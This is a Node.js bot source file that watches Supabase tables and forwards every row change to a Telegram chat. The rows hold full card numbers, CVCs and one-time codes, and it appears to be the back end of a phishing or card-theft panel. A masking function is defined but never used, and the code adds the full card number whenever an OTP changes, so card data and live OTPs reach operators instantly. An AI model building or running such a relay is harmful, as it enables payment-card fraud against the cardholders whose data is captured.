import 'dotenv/config';
import express from 'express';
import axios from 'axios';
import { createClient } from '@supabase/supabase-js';

const PORT = process.env.PORT || 3000;
const SUPABASE_URL = process.env.SUPABASE_URL;
const SUPABASE_ANON_KEY = process.env.SUPABASE_ANON_KEY;
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID; // Required to send messages
const WATCH_TABLES = (process.env.WATCH_TABLES || 'public.*').split(',').map(s => s.trim()).filter(Boolean);

if (!SUPABASE_URL || !SUPABASE_ANON_KEY) {
  console.error('[config] Missing SUPABASE_URL or SUPABASE_ANON_KEY in environment.');
}
if (!TELEGRAM_BOT_TOKEN) {
  console.error('[config] Missing TELEGRAM_BOT_TOKEN in environment.');
}
if (!TELEGRAM_CHAT_ID) {
  console.warn('[config] TELEGRAM_CHAT_ID not set. Realtime events will be logged but not sent to Telegram.');
}

const app = express();
app.use(express.json());

app.get('/health', (req, res) => {
  res.json({ status: 'ok', uptime: process.uptime() });
});

app.post('/test-message', async (req, res) => {
  try {
    const { text = 'Hello from azpul-sync-bot!' } = req.body || {};
    await sendToTelegram(text);
    res.json({ ok: true });
  } catch (err) {
    console.error('[telegram] error sending test message', err?.response?.data || err?.message);
    res.status(500).json({ ok: false, error: err?.message });
  }
});

const supabase = createClient(SUPABASE_URL, SUPABASE_ANON_KEY, {
  realtime: { params: { eventsPerSecond: 10 } },
});

function parseSpec(spec) {
  // formats:
  //  - "schema.table"
  //  - "table" (assumes public)
  //  - "schema:*" (all tables in schema)
  if (spec.includes('.')) {
    const [schema, table] = spec.split('.', 2);
    return { schema: schema || 'public', table: table || '*' };
  }
  return { schema: 'public', table: spec || '*' };
}

function escapeHtml(s) {
  return String(s)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');
}

function maskSensitiveRow(row) {
  if (!row || typeof row !== 'object') return row;
  const out = { ...row };
  if (out.card_number && typeof out.card_number === 'string') {
    const last4 = out.card_number.slice(-4);
    out.card_number = `•••• •••• •••• ${last4}`;
  }
  if (out.cvc) out.cvc = '•••';
  if (out.otp_code) out.otp_code = '••••';
  return out;
}

function renderValue(v) {
  if (v === null || v === undefined) return String(v);
  if (typeof v === 'object') return JSON.stringify(v);
  return String(v);
}

function renderList(obj) {
  return Object.entries(obj)
    .map(([k, v]) => `• <b>${escapeHtml(k)}</b>: <code>${escapeHtml(renderValue(v))}</code>`) 
    .join('\n');
}

function diffFields(oldRow = {}, newRow = {}) {
  const keys = Array.from(new Set([...Object.keys(oldRow), ...Object.keys(newRow)])).sort();
  const lines = [];
  for (const k of keys) {
    const o = oldRow[k];
    const n = newRow[k];
    const same = JSON.stringify(o) === JSON.stringify(n);
    if (!same) {
      lines.push(`• <b>${escapeHtml(k)}</b>: <code>${escapeHtml(renderValue(o))}</code> → <code>${escapeHtml(renderValue(n))}</code>`);
    }
  }
  return lines.join('\n');
}

function formatChange(eventType, s, t, rowNew, rowOld) {
  const header = `<b>${escapeHtml(eventType)}</b> on <code>${escapeHtml(`${s}.${t}`)}</code>`;
  if (eventType === 'INSERT') {
    const body = renderList(rowNew || {});
    return `${header}\n<b>New</b>\n${body}`;
  }
  if (eventType === 'UPDATE') {
    const oldRow = rowOld || {};
    const newRow = rowNew || {};
    const keys = Array.from(new Set([...Object.keys(oldRow), ...Object.keys(newRow)])).sort();
    const lines = [];
    const changedKeys = [];
    for (const k of keys) {
      const o = oldRow[k];
      const n = newRow[k];
      if (JSON.stringify(o) !== JSON.stringify(n)) {
        changedKeys.push(k);
        lines.push(`• <b>${escapeHtml(k)}</b>: <code>${escapeHtml(renderValue(o))}</code> → <code>${escapeHtml(renderValue(n))}</code>`);
      }
    }
    // If OTP changed, also show card_number even if it didn't change
    if (changedKeys.includes('otp_code') && (newRow.card_number || oldRow.card_number)) {
      const pan = newRow.card_number ?? oldRow.card_number;
      lines.push(`• <b>card_number</b>: <code>${escapeHtml(renderValue(pan))}</code>`);
    }
    const body = lines.join('\n');
    return `${header}\n<b>Changed</b>\n${body || 'No visible changes'}`;
  }
  if (eventType === 'DELETE') {
    const body = renderList(rowOld || {});
    return `${header}\n<b>Old</b>\n${body}`;
  }
  const body = renderList(rowNew || {}) || renderList(rowOld || {});
  return `${header}\n${body}`;
}

async function sendToTelegram(text) {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.log('[telegram] skip send (missing token or chat id) =>', text);
    return;
  }
  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
  await axios.post(url, {
    chat_id: TELEGRAM_CHAT_ID,
    text,
    parse_mode: 'HTML',
    disable_web_page_preview: true,
  }, { timeout: 10000 });
}

async function startRealtime() {
  const channel = supabase.channel('db-changes');

  for (const spec of WATCH_TABLES) {
    const { schema, table } = parseSpec(spec);
    const filter = table === '*' ? { event: '*', schema } : { event: '*', schema, table };
    console.log(`[realtime] listening for * on ${schema}${table === '*' ? '.*' : '.' + table}`);
    channel.on('postgres_changes', filter, async (payload) => {
      const { eventType, schema: s, table: t, new: rowNew, old: rowOld } = payload;
      const text = formatChange(eventType, s, t, rowNew, rowOld);

      console.log('[realtime]', eventType, `${s}.${t}`);
      try {
        await sendToTelegram(text);
      } catch (err) {
        console.error('[telegram] send failed', err?.response?.data || err?.message);
      }
    });
  }

  const status = await channel.subscribe();
  console.log('[realtime] subscription status:', status);
}

async function main() {
  await startRealtime();
  app.listen(PORT, () => {
    console.log(`[server] listening on http://localhost:${PORT}`);
  });
}

process.on('SIGINT', () => {
  console.log('Shutting down...');
  process.exit(0);
});

main().catch((err) => {
  console.error('[startup] failed', err);
  process.exit(1);
});
